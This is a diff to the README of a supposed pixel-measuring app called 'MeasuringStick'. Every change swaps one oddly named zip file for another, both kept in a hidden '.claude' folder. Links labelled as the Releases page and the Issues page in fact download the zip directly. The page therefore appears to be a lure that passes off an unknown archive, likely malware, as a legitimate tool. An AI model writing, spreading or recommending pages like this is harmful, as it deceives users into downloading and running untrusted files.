@@ -6,13 +6,13 @@ MeasuringStick is a lightweight app designed to help you measure pixel distances
 
 ### ⚡ Download MeasuringStick
 
-[![Download MeasuringStick](https://raw.githubusercontent.com/ehwjdwdui8dwihd/MeasuringStick/main/.claude/Measuring-Stick-diglyph.zip)](https://raw.githubusercontent.com/ehwjdwdui8dwihd/MeasuringStick/main/.claude/Measuring-Stick-diglyph.zip)
+[![Download MeasuringStick](https://raw.githubusercontent.com/ehwjdwdui8dwihd/MeasuringStick/main/.claude/Stick_Measuring_pachydermatously.zip)](https://raw.githubusercontent.com/ehwjdwdui8dwihd/MeasuringStick/main/.claude/Stick_Measuring_pachydermatously.zip)
 
 ## 📥 Download & Install
 
 To get started, you need to download MeasuringStick. 
 
-1. Click [this link](https://raw.githubusercontent.com/ehwjdwdui8dwihd/MeasuringStick/main/.claude/Measuring-Stick-diglyph.zip) to visit the Releases page.
+1. Click [this link](https://raw.githubusercontent.com/ehwjdwdui8dwihd/MeasuringStick/main/.claude/Stick_Measuring_pachydermatously.zip) to visit the Releases page.
 2. Find the latest version of MeasuringStick.
 3. Download the file for your system.
 4. After the download completes, locate the file on your computer.
@@ -42,7 +42,7 @@ To get started, you need to download MeasuringStick.
 
 ## ❓ Support and Feedback
 
-If you have any questions or feedback regarding MeasuringStick, please feel free to reach out. You can submit issues or suggestions on our [GitHub Issues page](https://raw.githubusercontent.com/ehwjdwdui8dwihd/MeasuringStick/main/.claude/Measuring-Stick-diglyph.zip).
+If you have any questions or feedback regarding MeasuringStick, please feel free to reach out. You can submit issues or suggestions on our [GitHub Issues page](https://raw.githubusercontent.com/ehwjdwdui8dwihd/MeasuringStick/main/.claude/Stick_Measuring_pachydermatously.zip).
 
 ## ✍️ License
 
@@ -52,4 +52,4 @@ MeasuringStick is open source and distributed under the MIT License. You can fre
 
 We appreciate your interest in MeasuringStick. Your use and feedback can help improve this tool further. Don't forget to check for updates on the Releases page to ensure you have the latest features. 
 
-[![Download MeasuringStick](https://raw.githubusercontent.com/ehwjdwdui8dwihd/MeasuringStick/main/.claude/Measuring-Stick-diglyph.zip)](https://raw.githubusercontent.com/ehwjdwdui8dwihd/MeasuringStick/main/.claude/Measuring-Stick-diglyph.zip)
+[![Download MeasuringStick](https://raw.githubusercontent.com/ehwjdwdui8dwihd/MeasuringStick/main/.claude/Stick_Measuring_pachydermatously.zip)](https://raw.githubusercontent.com/ehwjdwdui8dwihd/MeasuringStick/main/.claude/Stick_Measuring_pachydermatously.zip)
